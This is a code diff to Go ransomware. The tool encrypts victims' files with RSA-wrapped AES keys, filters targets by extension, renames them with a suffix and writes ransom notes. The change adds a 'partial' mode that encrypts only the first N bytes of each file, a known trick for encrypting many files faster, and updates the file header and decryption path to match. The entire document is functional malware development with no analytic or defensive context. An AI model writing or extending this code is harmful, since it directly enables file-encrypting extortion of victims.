@@ -27,17 +27,18 @@ type ransomData struct {
 
 // fileHeader holds metadata written at the start of each encrypted file.
 type fileHeader struct {
-	KeySizeBits uint16
-	FileMode    uint32
-	ModTime     int64
+	KeySizeBits  uint16
+	FileMode     uint32
+	ModTime      int64
+	PartialBytes int64 // 0 = full encryption; >0 = only first N bytes encrypted
 }
 
-// newFileHeader creates a fileHeader from file metadata and the RSA key size.
-func newFileHeader(info os.FileInfo, keySizeBits uint16) fileHeader {
+func newFileHeader(info os.FileInfo, keySizeBits uint16, partial int64) fileHeader {
 	return fileHeader{
-		KeySizeBits: keySizeBits,
-		FileMode:    uint32(info.Mode().Perm()),
-		ModTime:     info.ModTime().Unix(),
+		KeySizeBits:  keySizeBits,
+		FileMode:     uint32(info.Mode().Perm()),
+		ModTime:      info.ModTime().Unix(),
+		PartialBytes: partial,
 	}
 }
 
@@ -120,6 +121,11 @@ func Encrypt(ctx *urfavecli.Context) error {
 	extBlacklist := splitCommaSeparated(ctx.String("extBlacklist"))
 	extWhitelist := splitCommaSeparated(ctx.String("extWhitelist"))
 	encSuffix := ctx.String("encSuffix")
+	partial := ctx.Int64("partial")
+
+	if partial < 0 {
+		return errors.New("--partial must be a non-negative number of bytes")
+	}
 
 	if addRansom && ransomTemplatePath == "" {
 		return errors.New("ransomTemplatePath is required when addRansom is enabled")
@@ -157,6 +163,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 		"dryRun", dryRun,
 		"recursive", recursive,
 		"encSuffix", encSuffix,
+		"partial", partial,
 	)
 	slog.Debug("Extension filters",
 		"blacklist", extBlacklist,
@@ -177,7 +184,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 	}
 
 	if err := processFiles(files, workers, dryRun, "Encrypting", func(filePath string) error {
-		return encryptFile(filePath, plainAesKey, encryptedAesKey, keySizeBits, encSuffix)
+		return encryptFile(filePath, plainAesKey, encryptedAesKey, keySizeBits, partial, encSuffix)
 	}); err != nil {
 		return err
 	}
@@ -282,7 +289,7 @@ func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKe
 	})
 }
 
-func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keySizeBits uint16, encSuffix string) (retErr error) {
+func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keySizeBits uint16, partial int64, encSuffix string) (retErr error) {
 	src, err := os.Open(path)
 	if err != nil {
 		return err
@@ -292,6 +299,11 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keyS
 	srcInfo, err := src.Stat()
 	if err != nil {
 		return err
+	}
+
+	// Clamp partial to file size (encrypt whole file if partial >= file size).
+	if partial > 0 && partial >= srcInfo.Size() {
+		partial = 0
 	}
 
 	outPath := path + encSuffix
@@ -308,7 +320,7 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keyS
 		}
 	}()
 
-	hdr := newFileHeader(srcInfo, keySizeBits)
+	hdr := newFileHeader(srcInfo, keySizeBits, partial)
 	if err := hdr.writeTo(dst); err != nil {
 		return fmt.Errorf("write file header: %w", err)
 	}
@@ -317,7 +329,24 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, keyS
 		return fmt.Errorf("write encrypted key: %w", err)
 	}
 
-	return crypto.AesEncryptStream(src, dst, aesKey)
+	// Encrypt either the first N bytes (partial) or the entire file.
+	var encReader io.Reader = src
+	if partial > 0 {
+		encReader = io.LimitReader(src, partial)
+	}
+
+	if err := crypto.AesEncryptStream(encReader, dst, aesKey); err != nil {
+		return err
+	}
+
+	// Copy remaining unencrypted bytes (only for partial encryption).
+	if partial > 0 {
+		if _, err := io.Copy(dst, src); err != nil {
+			return fmt.Errorf("write unencrypted tail: %w", err)
+		}
+	}
+
+	return nil
 }
 
 func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (retErr error) {
@@ -369,6 +398,13 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) (
 
 	if err := crypto.AesDecryptStream(src, dst, aesKey); err != nil {
 		return err
+	}
+
+	// Copy remaining unencrypted bytes (partial encryption).
+	if hdr.PartialBytes > 0 {
+		if _, err := io.Copy(dst, src); err != nil {
+			return fmt.Errorf("read unencrypted tail: %w", err)
+		}
 	}
 
 	// Restore original permissions (also covers existing files where create mode is ignored).
